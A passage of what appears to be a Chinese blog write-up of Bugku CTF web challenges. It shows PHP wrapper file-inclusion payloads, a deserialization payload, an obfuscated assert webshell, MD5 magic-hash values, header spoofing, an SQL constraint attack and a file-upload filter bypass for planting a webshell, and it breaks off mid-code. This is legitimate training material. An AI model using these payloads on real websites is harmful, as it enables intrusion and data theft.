<p>file_get_contents是把整个文件读入字符串中，这里也就是把user这个变量（user显然要是一个文件）的内容以字符串的方式读出来并且要和“welcome to the bugkuctf”完全相等（类型，内容）。</p>
<p>（3）<code>include($file); // hint.php</code>所以我们要在满足条件之后读取file=hint.php。</p>
<p>知道了以上的三个条件后我们就可以做第一步了，就是如何满足他们的条件！？</p>
<p>这里就要使用php伪协议了。这道题目为了解决第二个条件，要用到   “php://input”协议。大致的意思是让　txt=php://input ，之后在post过去一个字符串.</p>
<h5 id="php伪协议介绍"><a href="#php伪协议介绍" class="headerlink" title="php伪协议介绍"></a>php伪协议介绍</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;input</span><br><span class="line">构造场景：本地web服务器根目录下有文件phpinput_server.php，</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">     $a &#x3D; $_GET[&#39;a&#39;];</span><br><span class="line">     $raw_post_data &#x3D; file_get_contents($a,&#39;r&#39;);&#x2F;&#x2F;&#39;php:&#x2F;&#x2F;input&#39;</span><br><span class="line">     echo $raw_post_data;</span><br><span class="line"> </span><br><span class="line"> ?&gt;</span><br><span class="line"> </span><br><span class="line">  </span><br><span class="line">在浏览器中按照如下方式访问：</span><br><span class="line">post框直接输入一段数据</span><br><span class="line">excute后，脚本会在页面中输出这段数据。</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607182627993.png" alt="image-20200607182627993"></p>
<p>此种方式可以用来获取post数据，但不能获取get数据。</p>
<p>具体介绍查看：<a href="https://www.cnblogs.com/yinqin/articles/4088589.html" target="_blank" rel="noopener">https://www.cnblogs.com/yinqin/articles/4088589.html</a></p>
<p>当传进去的参数作为文件名变量去打开文件时，可以将参数php://传进，同时post方式传进去值作为文件内容，供php代码执行时当做文件内容读取</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607182947553.png" alt="image-20200607182947553"></p>
<p>简单来说就是将指定字符串作为文件传给txt，然后再将user的内容读出来。此时我们就满足了</p>
<p>这样就满足了<code>(file_ get_ contents ($user,&#39; r&#39; )===&quot; welcome to the bugkuctf&quot;))</code>然后我们得到了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607183250757.png" alt="image-20200607183250757"></p>
<p>此时根据提示我们可以把包含的文件读出来了，这里要用到php的第二个伪协议：php://filter</p>
<p>即<code>txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php</code>（简单来说就是利用伪协议读取所包含文件的base64值）</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607183441201.png" alt="image-20200607183441201"></p>
<p>复制base64加密的内容进行解码，得到以下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#hint.php  </span><br><span class="line">  </span><br><span class="line">&lt;?php    </span><br><span class="line">    </span><br><span class="line">class Flag&#123;&#x2F;&#x2F;flag.php    </span><br><span class="line">    public $file;    </span><br><span class="line">    public function __tostring()&#123;    </span><br><span class="line">        if(isset($this-&gt;file))&#123;    </span><br><span class="line">            echo file_get_contents($this-&gt;file);   </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;  </span><br><span class="line">        return (&quot;good&quot;);  </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>之后可以继续利用伪协议读取一下index.php源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#index.php  </span><br><span class="line">&lt;?php    </span><br><span class="line">$txt &#x3D; $_GET[&quot;txt&quot;];    </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];    </span><br><span class="line">$password &#x3D; $_GET[&quot;password&quot;];    </span><br><span class="line">    </span><br><span class="line">if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123;    </span><br><span class="line">    echo &quot;hello friend!&lt;br&gt;&quot;;    </span><br><span class="line">    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;   </span><br><span class="line">        echo &quot;不能现在就给你flag哦&quot;;  </span><br><span class="line">        exit();    </span><br><span class="line">    &#125;else&#123;    </span><br><span class="line">        include($file);     </span><br><span class="line">        $password &#x3D; unserialize($password);    </span><br><span class="line">        echo $password;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;else&#123;    </span><br><span class="line">    echo &quot;you are not the number of bugku ! &quot;;    </span><br><span class="line">&#125;    </span><br><span class="line">    </span><br><span class="line">?&gt;    </span><br><span class="line">    </span><br><span class="line">&lt;!--    </span><br><span class="line">$user &#x3D; $_GET[&quot;txt&quot;];    </span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];    </span><br><span class="line">$pass &#x3D; $_GET[&quot;password&quot;];    </span><br><span class="line">    </span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the bugkuctf&quot;))&#123;    </span><br><span class="line">    echo &quot;hello admin!&lt;br&gt;&quot;;    </span><br><span class="line">    include($file); &#x2F;&#x2F;hint.php    </span><br><span class="line">&#125;else&#123;    </span><br><span class="line">    echo &quot;you are not admin ! &quot;;    </span><br><span class="line">&#125;    </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure>

<p>（1）在hint.php中我们看到了<code>class Flag{//flag.php</code>  ，所以我们把index.php改成flag.php看看会有什么结果，发现</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607184045001.png" alt="image-20200607184045001"></p>
<p>居然返回了乱码，看到之前的源码可以知道这是<code>index.php</code>中的<code>echo &quot;不能现在就给你flag哦&quot;;</code>所以不能直接<code>flag.php</code>。</p>
<p>在index我们看到，这个意思是file中如果包含‘flag’，那么就会给你退出。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607184245372.png" alt="image-20200607184245372"></p>
<p>所以我们要想其他办法读flag.php</p>
<p>我们往下看可以看到</p>
<p>这个else写到如果我的file不包含‘flag’，那么我就会把那个文件包含进来，之后将password反序列化一下。并输出password的结果。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">else&#123;    </span><br><span class="line">        include($file);     </span><br><span class="line">        $password &#x3D; unserialize($password);    </span><br><span class="line">        echo $password;    </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>而我们根据上面的hint.php发现，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#hint.php  </span><br><span class="line">  </span><br><span class="line">&lt;?php    </span><br><span class="line">    </span><br><span class="line">class Flag&#123;&#x2F;&#x2F;flag.php    </span><br><span class="line">    public $file;    </span><br><span class="line">    public function __tostring()&#123;    </span><br><span class="line">        if(isset($this-&gt;file))&#123;    </span><br><span class="line">            echo file_get_contents($this-&gt;file);   </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;  </span><br><span class="line">        return (&quot;good&quot;);  </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我们发现当Flag方法当做字符串执行时，会自动执行 __tostring 方法，方法中写了如果file文件存在，那么就输出file文件中的内容。</p>
<p>这不正是我们要解决的输出flag.php内容的情况吗？？？</p>
<p>所以我们要构造一个Flag类型的参数，并把这个参数传给password然后get进去。并且这个file的值要是hint.php（因为要利用hint.php中的函数），即：——根据php序列化的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    class Flag&#123;</span><br><span class="line">    public $file;    </span><br><span class="line">    &#125;    </span><br><span class="line">  </span><br><span class="line">    $a &#x3D; new Flag();  </span><br><span class="line">    $a-&gt;file &#x3D; &quot;flag.php&quot;;  </span><br><span class="line">    $a &#x3D; serialize($a);  </span><br><span class="line">    print_r($a);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p> 得到：　　O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}  传入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607190756684.png" alt="image-20200607190756684"></p>
<p>得到</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607190814885.png" alt="image-20200607190814885"></p>
<h4 id="过狗一句话"><a href="#过狗一句话" class="headerlink" title="过狗一句话"></a>过狗一句话</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607174619683.png" alt="image-20200607174619683"></p>
<p>查看原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607174643967.png" alt="image-20200607174643967"></p>
<p>可以看到题目中给的提示</p>
<p>使用explode函数将poc变量里的#进行截断，然后将分离出来的值放到数组中，得到assert</p>
<p><code>exlpde()分割a#s#s#e#r#t 为 assert</code></p>
<p>用assert函数来解析传进来的字符，assert有代码执行漏洞。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$poc&#x3D;&quot;a#s#s#e#r#t&quot;;</span><br><span class="line">$poc_1&#x3D;explode(&quot;#&quot;,$poc); $poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>构造Payload：<code>http://123.206.87.240:8010/?s=print_r(scandir(&#39;./&#39;))</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607175205721.png" alt="image-20200607175205721"></p>
<p>可以看到里面有f94lag.txt文件，在url中添加改文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607175305991.png" alt="image-20200607175305991"></p>
<h4 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h4><p>打开页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527155731657.png" alt="image-20200527155731657"></p>
<p>查看源页面，可以看到有正则匹配然后构造Payload:<code>keykeykeykeykeykeykeykeykeykey:///keykeykeyx&quot;i</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527155822458.png" alt="image-20200527155822458"></p>
<p>成功返回KEY值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527160225084.png" alt="image-20200527160225084"></p>
<h4 id="前女友-SKCTF"><a href="#前女友-SKCTF" class="headerlink" title="前女友(SKCTF)"></a>前女友(SKCTF)</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192732367.png" alt="image-20200607192732367"></p>
<p>查看原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607192825276.png" alt="image-20200607192825276"></p>
<p>点击<strong>链接</strong>这两个字。</p>
<p>发现一段代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607193505347.png" alt="image-20200607193505347"></p>
<p>里面有MD5，MD5是不能处理数组的，所以构造Payload：<code>v1[]=1&amp;v2[]=2&amp;v3[]=3</code>，然后返回flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200607193720093.png" alt="image-20200607193720093"></p>
<h4 id="login1-SKCTF"><a href="#login1-SKCTF" class="headerlink" title="login1(SKCTF)"></a>login1(SKCTF)</h4><p>打开网址，可以看到题目提示SQL注入约束攻击</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527160418382.png" alt="image-20200527160418382"></p>
<p>SQL约束攻击：在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。</p>
<p>我们尝试了暴力破解等，发现并不能破解出来，我们知道像这种管理后台用户名是admin毋庸置疑，所以利用SQL约束攻击的特性进行攻击，注册用户</p>
<p>更改了Type让其显示输入的密码，点击注册</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527172806930.png" alt="image-20200527172806930"></p>
<p>返回了注册成功，等两秒就会返回登录界面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527172857635.png" alt="image-20200527172857635"></p>
<p>在登录界面输入刚才注册的用户名和密码，成功返回。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527173023123.png" alt="image-20200527173023123"></p>
<h4 id="你从哪里来"><a href="#你从哪里来" class="headerlink" title="你从哪里来"></a>你从哪里来</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527174500035.png" alt="image-20200527174500035"></p>
<p>返回了 Are you from google？(你是谷歌的吗？)</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527174604248.png" alt="image-20200527174604248"></p>
<p>到这就可以看出，上面是需要我们伪造一下链接Referer</p>
<p>Payload：<code>https://www.google.com</code></p>
<p>你是无法在页面中更改的，所以使用burp抓包，然后发送的Repeater中进行更改运行。</p>
<p>成功返回flag，复制提交就ok</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527174851825.png" alt="image-20200527174851825"></p>
<h4 id="md5-collision-NUPT-CTF"><a href="#md5-collision-NUPT-CTF" class="headerlink" title="md5 collision(NUPT_CTF)"></a>md5 collision(NUPT_CTF)</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527180144324.png" alt="image-20200527180144324"></p>
<p>原始页面，让其输入a，我们输入?a=1查看返会结果</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527180242821.png" alt="image-20200527180242821"></p>
<p>返回false说明错误。这里已经已经看过了burp抓包和F12了，什么都没有。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527180318161.png" alt="image-20200527180318161"></p>
<p>当我看看题目的时候发现题目是MD5碰撞，我们百度一下什么是MD5碰撞</p>
<p>解释是：</p>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
<p>攻击者可以利用这一漏洞，通过输入一个经过哈希后以”0E”开头的字符串，即会被PHP解释为0，如果数据库中存在这种哈希值以”0E”开头的密码的话，他就可以以这个用户的身份登录进去，尽管并没有真正的密码。</p>
<p>原文链接：<a href="https://blog.csdn.net/qq_30464257/article/details/81432446" target="_blank" rel="noopener">https://blog.csdn.net/qq_30464257/article/details/81432446</a></p>
<p>其中常见的MD5碰撞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">0e开头的md5和原值：</span><br><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>

<p>以上的MD5碰撞哪一个都行，所以我们只要随便复制一个就可以。复制提交就可以。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200527180825418.png" alt="image-20200527180825418"></p>
<h4 id="程序员本地网站"><a href="#程序员本地网站" class="headerlink" title="程序员本地网站"></a>程序员本地网站</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528081646555.png" alt="image-20200528081646555"></p>
<p>显示原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528081720351.png" alt="image-20200528081720351"></p>
<p>显示从本地访问，这样肯明显就需伪造一下IP，当然想要我在IP的话就需要用burp进行抓包修改运行</p>
<p>将抓取的数据包发送到Repeter模块，在其中加入X-Forwarded-for:127.0.0.1</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528081836626.png" alt="image-20200528081836626"></p>
<p>这样就成功显示flag了，直接复制提交就OK</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528082002023.png" alt="image-20200528082002023"></p>
<h4 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528084108275.png" alt="image-20200528084108275"></p>
<p>查看原始页面</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528084159215.png" alt="image-20200528084159215"></p>
<p>从以上代码分析，可以看到几条有用的信息</p>
<p>1、使 uname的sha1值 与 passwd的sha1的值 相等</p>
<p>2、但是同时 uname 和 passwd两个的值又不能相等</p>
<p>3、id == “margin”</p>
<p>解决办法</p>
<p>1、GTE输入的有uname和id，POST输出的是passwd</p>
<p>2、把 uname 和 passwd定义成数组，数组的哈希值相同</p>
<p>3、id等于margin</p>
<p>在页面中输入，复制提交即可</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528084608223.png" alt="image-20200528084608223"></p>
<h4 id="Web-8"><a href="#Web-8" class="headerlink" title="Web 8"></a>Web 8</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528090245666.png" alt="image-20200528090245666"></p>
<p>原始页面，代码审计</p>
<p>题目上显示txt？？？？，尝试访问flag.txt看看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528090259220.png" alt="image-20200528090259220"></p>
<p>返回了内容flags。对代码进行分析</p>
<p>$ac===$f，结合其他代码说明$f是文件名，$ac是文件内容，只有这样他们才能全等于</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528090404175.png" alt="image-20200528090404175"></p>
<p>这样就在URL中构造payload</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528090629300.png" alt="image-20200528090629300"></p>
<p>还有一种方法。</p>
<p>1、ac不能为空</p>
<p>2、f的值从fn中获取的</p>
<p>3、ac的值要全等于f</p>
<p>构造payload<code>?ac=123&amp;fn=php://input,,,,[PSOT]123</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528091050880.png" alt="image-20200528091050880"></p>
<h4 id="细心"><a href="#细心" class="headerlink" title="细心"></a>细心</h4><p>打开网址</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528091630704.png" alt="image-20200528091630704"></p>
<p>查看原始页面，可以发现是404页面，显示错误。因为是直接显示错误，抓包什么的没有任何有用的内容<img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528091651242.png" alt="image-20200528091651242"></p>
<p>使用御剑扫描一下发现了这两个网站，第2个因为是index.php结尾，就是我们的初始访问的404页面所以无用，那就是第一个了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528091927004.png" alt="image-20200528091927004"></p>
<p>访问第一个网站，这是初始界面，可以看到给了一个resusl.php的文件，尝试访问一下。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528092053317.png" alt="image-20200528092053317"></p>
<p>居然进入到了后台，可以看到屏幕中显示你不是管理员你的IP已经被记录到日志了。<img src="https://gitee.com/zhanqiaozai/picture/raw/master/0064D4DD.gif" alt="img"></p>
<p>卧槽，被记录了，但是在左下角有一串代码，而且题目给的提示是：想办法变成admin，尝试一下<code>?x=admin</code>试试，看看能否访问</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528092201182.png" alt="image-20200528092201182"></p>
<p>发现成功访问了，复制提交即可。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528092535147.png" alt="image-20200528092535147"></p>
<h4 id="求getshell"><a href="#求getshell" class="headerlink" title="求getshell"></a>求getshell</h4><p>打开网页</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210230364.png" alt="image-20200528210230364"></p>
<p>查看原始页面，可以看到，标题让上传图片而不是php，这一看就是文件上传，构造一个文件上传的payload</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210252464.png" alt="image-20200528210252464"></p>
<p>将其文件名改为png，jpg等图片文件后缀，然后进行上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210430305.png" alt="image-20200528210430305"></p>
<p>上传后返回了图片上传的路径，复制路径到URL中，进行访问，看能否出现空白图片，因为这是伪造的图片所以是空白的不会显示任何内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210730378.png" alt="image-20200528210730378"></p>
<p>将文件放到URL后，返回了空白图片，右键复制图片地址在菜刀或者蚁剑连接。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210816733.png" alt="image-20200528210816733"></p>
<p>发现不管是蚁剑还是菜刀都连接不上，不管怎样修改都连接不上，可以猜测图片到后台被删除了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528210853780.png" alt="image-20200528210853780"></p>
<p>所以我们使用另一种方法，使用burp抓包试试，这里就可以将文件后缀改为php了，抓完包后将Type改为image/jpeg就可以</p>
<p>经过测试php2, php3, php4, php5，phps, pht, phtm, phtml，只有php5才能绕过，这里用了黑名单过滤</p>
<p>请求头部的Content-Type字段，进行大小写绕过，即把multipart/form-data中任意一个字母改成大写即可绕过</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200528211615205.png" alt="image-20200528211615205"></p>
<h4 id="INSERT-INTO注入"><a href="#INSERT-INTO注入" class="headerlink" title="INSERT INTO注入"></a>INSERT INTO注入</h4><p>打开网页，可以看到题目给的源码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200614094836949.png" alt="image-20200614094836949"></p>
<p>源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip &#x3D; &#39;&#39;;</span><br><span class="line">if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr &#x3D; explode(&#39;,&#39;, $ip);</span><br><span class="line">return $ip_arr[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host&#x3D;&quot;localhost&quot;;</span><br><span 